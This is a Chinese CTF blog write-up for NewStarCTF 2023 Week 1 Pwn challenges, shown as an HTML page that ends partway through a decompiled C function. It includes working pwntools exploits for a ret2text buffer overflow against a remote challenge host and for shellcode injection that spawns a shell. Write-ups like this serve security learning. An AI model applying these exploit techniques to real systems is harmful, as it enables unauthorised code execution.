@@ -1,0 +1,576 @@
+<!DOCTYPE html>
+<html itemscope itemtype="http://schema.org/WebPage" lang="zh-CN">
+  <head>
+    
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+    <meta name="robots" content="noodp" />
+    <title>NewStarCTF2023-Week1-Pwn - 好好学习</title><meta name="author" content="alextang">
+<meta name="author-link" content="">
+<meta name="description" content="ret2text 首先checksec 发现程序开启GOT完全只读和栈不可执行，但是没有开启随机化和Canary。 扔进ida64看下： 发现read处存在溢出（" /><meta name="keywords" content='CTF, Pwn, WriteUp' />
+  <meta itemprop="name" content="NewStarCTF2023-Week1-Pwn">
+  <meta itemprop="description" content="ret2text 首先checksec 发现程序开启GOT完全只读和栈不可执行，但是没有开启随机化和Canary。 扔进ida64看下： 发现read处存在溢出（">
+  <meta itemprop="datePublished" content="2023-10-03T11:00:40+08:00">
+  <meta itemprop="dateModified" content="2023-10-03T11:00:40+08:00">
+  <meta itemprop="wordCount" content="1703">
+  <meta itemprop="keywords" content="CTF,Pwn,WriteUp"><meta property="og:url" content="https://alextang.top/articles/2023/10/newstarctf2023-week1-pwn/">
+  <meta property="og:site_name" content="好好学习">
+  <meta property="og:title" content="NewStarCTF2023-Week1-Pwn">
+  <meta property="og:description" content="ret2text 首先checksec 发现程序开启GOT完全只读和栈不可执行，但是没有开启随机化和Canary。 扔进ida64看下： 发现read处存在溢出（">
+  <meta property="og:locale" content="zh_CN">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2023-10-03T11:00:40+08:00">
+    <meta property="article:modified_time" content="2023-10-03T11:00:40+08:00">
+    <meta property="article:tag" content="CTF">
+    <meta property="article:tag" content="Pwn">
+    <meta property="article:tag" content="WriteUp">
+
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="NewStarCTF2023-Week1-Pwn">
+  <meta name="twitter:description" content="ret2text 首先checksec 发现程序开启GOT完全只读和栈不可执行，但是没有开启随机化和Canary。 扔进ida64看下： 发现read处存在溢出（">
+      <meta name="twitter:site" content="@a1extang">
+<meta name="application-name" content="a1extang">
+<meta name="apple-mobile-web-app-title" content="a1extang"><meta name="theme-color" data-light="#f8f8f8" data-dark="#252627" content="#f8f8f8"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+    <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="canonical" href="https://alextang.top/articles/2023/10/newstarctf2023-week1-pwn/" /><link rel="prev" href="https://alextang.top/articles/2023/10/newstarctf2023-week1-web/" /><link rel="next" href="https://alextang.top/articles/2023/10/newstarctf2023-week1-misc/" /><link rel="stylesheet" href="/css/style.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.4.2/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/animate.css@4.1.1/animate.min.css"><script type="application/ld+json">
+  {
+    "@context": "http://schema.org",
+    "@type": "BlogPosting",
+    "headline": "NewStarCTF2023-Week1-Pwn",
+    "inLanguage": "zh-CN",
+    "mainEntityOfPage": {
+      "@type": "WebPage",
+      "@id": "https:\/\/alextang.top\/articles\/2023\/10\/newstarctf2023-week1-pwn\/"
+    },"genre": "posts","keywords": "CTF, Pwn, WriteUp","wordcount":  1703 ,
+    "url": "https:\/\/alextang.top\/articles\/2023\/10\/newstarctf2023-week1-pwn\/","datePublished": "2023-10-03T11:00:40+08:00","dateModified": "2023-10-03T11:00:40+08:00","publisher": {
+      "@type": "Organization",
+      "name": ""},"author": {
+        "@type": "Person",
+        "name": "alextang"
+      },"description": ""
+  }
+  </script></head>
+  <body data-header-desktop="sticky" data-header-mobile="auto"><script>(window.localStorage?.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('auto' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'auto' === 'dark')) && document.body.setAttribute('data-theme', 'dark');</script><div class="wrapper" data-page-style="normal"><header class="desktop animate__faster" id="header-desktop">
+  <div class="header-wrapper">
+    <div class="header-title">
+      <a href="/" title="好好学习"><span class="header-title-text">a1extang</span></a><span class="header-subtitle"></span></div>
+    <nav>
+      <ul class="menu"><li class="menu-item">
+              <a
+                class="menu-link"
+                href="/posts/"
+                
+                
+              ><i class="fa-solid fa-archive fa-fw fa-sm" aria-hidden="true"></i> 文章</a></li><li class="menu-item">
+              <a
+                class="menu-link"
+                href="/categories/"
+                
+                
+              ><i class="fa-solid fa-th fa-fw fa-sm" aria-hidden="true"></i> 分类</a></li><li class="menu-item">
+              <a
+                class="menu-link"
+                href="/tags/"
+                
+                
+              ><i class="fa-solid fa-tags fa-fw fa-sm" aria-hidden="true"></i> 标签</a></li><li class="menu-item">
+              <a
+                class="menu-link"
+                href="/about/"
+                title="关于"
+                
+              ><i class="fas fa-user fa-fw fa-sm" aria-hidden="true"></i> 关于</a></li><li class="menu-item delimiter"></li><li class="menu-item search" id="search-desktop">
+            <input type="text" placeholder="搜索文章标题或内容……" id="search-input-desktop">
+            <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="搜索">
+              <i class="fa-solid fa-search fa-fw" aria-hidden="true"></i>
+            </a>
+            <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="清空">
+              <i class="fa-solid fa-times-circle fa-fw" aria-hidden="true"></i>
+            </a>
+            <span class="search-button search-loading" id="search-loading-desktop">
+              <i class="fa-solid fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+            </span>
+          </li><li class="menu-item theme-switch" title="切换主题">
+          <i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i>
+        </li></ul>
+    </nav>
+  </div>
+</header><header class="mobile animate__faster" id="header-mobile">
+  <div class="header-container">
+    <div class="header-wrapper">
+      <div class="header-title">
+        <a href="/" title="好好学习"><span class="header-title-text">a1extang</span></a><span class="header-subtitle"></span></div>
+      <div class="menu-toggle" id="menu-toggle-mobile">
+        <span></span><span></span><span></span>
+      </div>
+    </div>
+    <nav>
+      <ul class="menu" id="menu-mobile"><li class="search-wrapper">
+            <div class="search mobile" id="search-mobile">
+              <input type="text" placeholder="搜索文章标题或内容……" id="search-input-mobile">
+              <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="搜索">
+                <i class="fa-solid fa-search fa-fw" aria-hidden="true"></i>
+              </a>
+              <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="清空">
+                <i class="fa-solid fa-times-circle fa-fw" aria-hidden="true"></i>
+              </a>
+              <span class="search-button search-loading" id="search-loading-mobile">
+                <i class="fa-solid fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+              </span>
+            </div>
+            <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
+              取消
+            </a>
+          </li><li
+              class="menu-item"
+            ><a
+                  class="menu-link"
+                  href="/posts/"
+                  
+                  
+                ><i class="fa-solid fa-archive fa-fw fa-sm" aria-hidden="true"></i> 文章</a></li><li
+              class="menu-item"
+            ><a
+                  class="menu-link"
+                  href="/categories/"
+                  
+                  
+                ><i class="fa-solid fa-th fa-fw fa-sm" aria-hidden="true"></i> 分类</a></li><li
+              class="menu-item"
+            ><a
+                  class="menu-link"
+                  href="/tags/"
+                  
+                  
+                ><i class="fa-solid fa-tags fa-fw fa-sm" aria-hidden="true"></i> 标签</a></li><li
+              class="menu-item"
+            ><a
+                  class="menu-link"
+                  href="/about/"
+                  title="关于"
+                  
+                ><i class="fas fa-user fa-fw fa-sm" aria-hidden="true"></i> 关于</a></li><li class="menu-item menu-system">
+          <span class="menu-system-item theme-switch" title="切换主题"><i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i></span></li>
+      </ul>
+    </nav>
+  </div>
+</header><div class="search-dropdown desktop">
+    <div id="search-dropdown-desktop"></div>
+  </div>
+  <div class="search-dropdown mobile">
+    <div id="search-dropdown-mobile"></div>
+  </div><main class="container"><aside class="toc" id="toc-auto"></aside>
+
+  <aside class="aside-custom">
+    </aside>
+
+  <article class="page single">
+    <div class="header"><h1 class="single-title animate__animated animate__flipInX"><span>NewStarCTF2023-Week1-Pwn</span>
+      </h1></div><div class="post-meta">
+      <div class="post-meta-line"><span class="post-author"><span class="author"><img loading="lazy" src="https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/1693637676533.jpg" srcset="https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/1693637676533.jpg?size=small, https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/1693637676533.jpg?size=medium 1.5x, https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/1693637676533.jpg?size=large 2x" sizes="auto" data-title="alextang" data-alt="alextang" class="avatar" style="background: url(/svg/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const i of ['style', 'data-title','data-alt','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const i of ['style', 'data-title','data-alt','onerror','onload']){this.removeAttribute(i);}"/>&nbsp;alextang</span></span>
+          <span class="post-category">收录于 <a href="/categories/writeup/"><i class="fa-regular fa-folder fa-fw" aria-hidden="true"></i> WriteUp</a></span></div>
+      <div class="post-meta-line"><span title="发布于 2023-10-03 11:00:40"><i class="fa-regular fa-calendar-alt fa-fw me-1" aria-hidden="true"></i><time datetime="2023-10-03">2023-10-03</time></span>&nbsp;<span title="更新于 2023-10-03 11:00:40"><i class="fa-regular fa-edit fa-fw me-1" aria-hidden="true"></i><time datetime="2023-10-03">2023-10-03</time></span>&nbsp;<span title="1703 字"><i class="fa-solid fa-pencil-alt fa-fw me-1" aria-hidden="true"></i>约 1800 字</span>&nbsp;<span><i class="fa-regular fa-clock fa-fw me-1" aria-hidden="true"></i>预计阅读 4 分钟</span>&nbsp;</div>
+    </div><div class="content" id="content"><h1 id="ret2text">ret2text</h1>
+<p>首先checksec</p>
+<p><img loading="lazy" src="https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231003110256058.png" srcset="https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231003110256058.png?size=small, https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231003110256058.png?size=medium 1.5x, https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231003110256058.png?size=large 2x" sizes="auto" data-title="image-20231003110256058" data-alt="image-20231003110256058" style="background: url(/svg/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const i of ['style', 'data-title','data-alt','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const i of ['style', 'data-title','data-alt','onerror','onload']){this.removeAttribute(i);}"/></p>
+<p>发现程序开启GOT完全只读和栈不可执行，但是没有开启随机化和Canary。</p>
+<p>扔进ida64看下：</p>
+<p><img loading="lazy" src="https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231003110942529.png" srcset="https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231003110942529.png?size=small, https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231003110942529.png?size=medium 1.5x, https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231003110942529.png?size=large 2x" sizes="auto" data-title="https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231003110942529.png" data-alt="https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231003110942529.png" style="background: url(/svg/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const i of ['style', 'data-title','data-alt','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const i of ['style', 'data-title','data-alt','onerror','onload']){this.removeAttribute(i);}"/></p>
+<p>发现read处存在溢出（buff只有32字节但是读了256字节）。</p>
+<p>同时发现后门函数backdoor：</p>
+<p><img loading="lazy" src="https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231003111225107.png" srcset="https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231003111225107.png?size=small, https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231003111225107.png?size=medium 1.5x, https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231003111225107.png?size=large 2x" sizes="auto" data-title="image-20231003111225107" data-alt="image-20231003111225107" style="background: url(/svg/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const i of ['style', 'data-title','data-alt','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const i of ['style', 'data-title','data-alt','onerror','onload']){this.removeAttribute(i);}"/></p>
+<p>于是就是一道非常标准的ret2text，这里通过buf的溢出劫持RIP指向backdoor进行执行即可。</p>
+<p>根据ida的显示，buf距离栈底20h的距离，64位程序栈单元是8字节，backdoor的后门地址是0x4011fb。同时，由于跳过了call的步骤直接跳转到backdoor地址执行，可能破坏原有的堆栈平衡，这里将backdoor的ret地址（0x40122D）在执行前丢进栈，保证堆栈平衡。</p>
+<p>所以payload如下：</p>
+<div class="highlight" id="id-1"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="p">(</span><span class="n">arch</span> <span class="o">=</span> <span class="s1">&#39;amd64&#39;</span><span class="p">,</span> <span class="n">os</span> <span class="o">=</span> <span class="s1">&#39;linux&#39;</span><span class="p">,</span> <span class="n">log_level</span> <span class="o">=</span> <span class="s1">&#39;debug&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">#r = process(&#39;./ret2text&#39;)</span>
+</span></span><span class="line"><span class="cl"><span class="n">r</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;node4.buuoj.cn&#39;</span><span class="p">,</span><span class="mi">29883</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">offset</span> <span class="o">=</span> <span class="mh">0x20</span>
+</span></span><span class="line"><span class="cl"><span class="n">backdoor</span> <span class="o">=</span> <span class="mh">0x4011fb</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span>  <span class="sa">b</span><span class="s1">&#39;a&#39;</span> <span class="o">*</span> <span class="n">offset</span> <span class="o">+</span> <span class="sa">b</span><span class="s1">&#39;b&#39;</span> <span class="o">*</span> <span class="mi">8</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x40122D</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">backdoor</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">r</span><span class="o">.</span><span class="n">sendafter</span><span class="p">(</span><span class="s1">&#39;magic&#39;</span><span class="p">,</span><span class="n">payload</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">r</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>然后远程连接程序即可：</p>
+<p><img loading="lazy" src="https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231003112352853.png" srcset="https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231003112352853.png?size=small, https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231003112352853.png?size=medium 1.5x, https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231003112352853.png?size=large 2x" sizes="auto" data-title="image-20231003112352853" data-alt="image-20231003112352853" style="background: url(/svg/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const i of ['style', 'data-title','data-alt','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const i of ['style', 'data-title','data-alt','onerror','onload']){this.removeAttribute(i);}"/></p>
+<h1 id="ezshellcode">ezshellcode</h1>
+<p>首先checksec，发现开启了栈保护和部分RELRO</p>
+<p><img loading="lazy" src="https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231004101724816.png" srcset="https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231004101724816.png?size=small, https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231004101724816.png?size=medium 1.5x, https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231004101724816.png?size=large 2x" sizes="auto" data-title="image-20231004101724816" data-alt="image-20231004101724816" style="background: url(/svg/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const i of ['style', 'data-title','data-alt','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const i of ['style', 'data-title','data-alt','onerror','onload']){this.removeAttribute(i);}"/></p>
+<p>ida64，发现主要代码就如下所示：</p>
+<p><img loading="lazy" src="https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231004101904309.png" srcset="https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231004101904309.png?size=small, https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231004101904309.png?size=medium 1.5x, https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231004101904309.png?size=large 2x" sizes="auto" data-title="image-20231004101904309" data-alt="image-20231004101904309" style="background: url(/svg/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const i of ['style', 'data-title','data-alt','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const i of ['style', 'data-title','data-alt','onerror','onload']){this.removeAttribute(i);}"/></p>
+<p>这里我们发现buf被存放在mmap申请（映射）的0x66660000的地址，并且后面直接用read读了256个字节。最后jumpout直接跳转到buf所在位置进行执行。</p>
+<p>结合题目的意思，应该是只要将shellcode读入即可。</p>
+<p>我们直接运行一下程序，也证明了我的猜测：</p>
+<p><img loading="lazy" src="https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231004102205235.png" srcset="https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231004102205235.png?size=small, https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231004102205235.png?size=medium 1.5x, https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231004102205235.png?size=large 2x" sizes="auto" data-title="image-20231004102205235" data-alt="image-20231004102205235" style="background: url(/svg/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const i of ['style', 'data-title','data-alt','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const i of ['style', 'data-title','data-alt','onerror','onload']){this.removeAttribute(i);}"/></p>
+<p>下面只要找任意一个小于256字节的shellcode传入即可。</p>
+<p>这里直接使用pwntool自带的shellcraft。</p>
+<div class="highlight" id="id-2"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="p">(</span><span class="n">arch</span><span class="o">=</span><span class="s1">&#39;amd64&#39;</span><span class="p">,</span><span class="n">os</span><span class="o">=</span><span class="s1">&#39;linux&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">r</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s2">&#34;./ezshellcode&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="n">asm</span><span class="p">(</span><span class="n">shellcraft</span><span class="o">.</span><span class="n">sh</span><span class="p">())</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">#r.recvuntil(b&#39;magic\n&#39;)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">r</span><span class="o">.</span><span class="n">sendafter</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;magic</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">,</span><span class="n">payload</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">r</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>注意这里一定要将\n读入，否则进入shell就会直接退出。</p>
+<h1 id="newstar-shop">newstar shop</h1>
+<p>首先checksec，发现保护全开</p>
+<p><img loading="lazy" src="https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231004110416116.png" srcset="https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231004110416116.png?size=small, https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231004110416116.png?size=medium 1.5x, https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231004110416116.png?size=large 2x" sizes="auto" data-title="image-20231004110416116" data-alt="image-20231004110416116" style="background: url(/svg/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const i of ['style', 'data-title','data-alt','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const i of ['style', 'data-title','data-alt','onerror','onload']){this.removeAttribute(i);}"/></p>
+<p>先用ida打开一下：</p>
+<p><img loading="lazy" src="https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231004111654367.png" srcset="https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231004111654367.png?size=small, https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231004111654367.png?size=medium 1.5x, https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231004111654367.png?size=large 2x" sizes="auto" data-title="image-20231004111654367" data-alt="image-20231004111654367" style="background: url(/svg/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const i of ['style', 'data-title','data-alt','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const i of ['style', 'data-title','data-alt','onerror','onload']){this.removeAttribute(i);}"/></p>
+<p>发现应该是一个互动的程序。依次查看三个函数：</p>
+<p>shop</p>
+<div class="highlight" id="id-3"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span><span class="lnt">48
+</span><span class="lnt">49
+</span><span class="lnt">50
+</span><span class="lnt">51
+</span><span class="lnt">52
+</span><span class="lnt">53
+</span><span class="lnt">54
+</span><span class="lnt">55
+</span><span class="lnt">56
+</span><span class="lnt">57
+</span><span class="lnt">58
+</span><span class="lnt">59
+</span><span class="lnt">60
+</span><span class="lnt">61
+</span><span class="lnt">62
+</span><span class="lnt">63
+</span><span class="lnt">64
+</span><span class="lnt">65
+</span><span class="lnt">66
+</span><span class="lnt">67
+</span><span class="lnt">68
+</span><span class="lnt">69
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">unsigned</span> <span class="kr">__int64</span> <span class="nf">shop</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="kt">int</span> <span class="n">v1</span><span class="p">;</span> <span class="c1">// [rsp+4h] [rbp-Ch] BYREF
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">unsigned</span> <span class="kr">__int64</span> <span class="n">v2</span><span class="p">;</span> <span class="c1">// [rsp+8h] [rbp-8h]
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
+</span></span><span class="line"><span class="cl">  <span class="n">v2</span> <span class="o">=</span> <span class="nf">__readfsqword</span><span class="p">(</span><span class="mh">0x28u</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;=============================&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;===Welcome to newstar shop===&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;=============================&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;1.newstar&#39;s gift          20$&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;2.pwn write up            40$&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;3.shell                 9999$&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;All things are only available for one day!&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;What do you want to buy?&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span> <span class="p">(</span><span class="kt">int</span><span class="p">)</span><span class="nf">__isoc99_scanf</span><span class="p">(</span><span class="s">&#34;%d&#34;</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">v1</span><span class="p">)</span> <span class="o">&lt;=</span> <span class="mi">0</span> <span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;Invalid input&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span> <span class="n">v1</span> <span class="o">!=</span> <span class="mi">3</span> <span class="p">)</span>
+</span></span><span class="line"><span class="cl">  <span class="p">{</span>
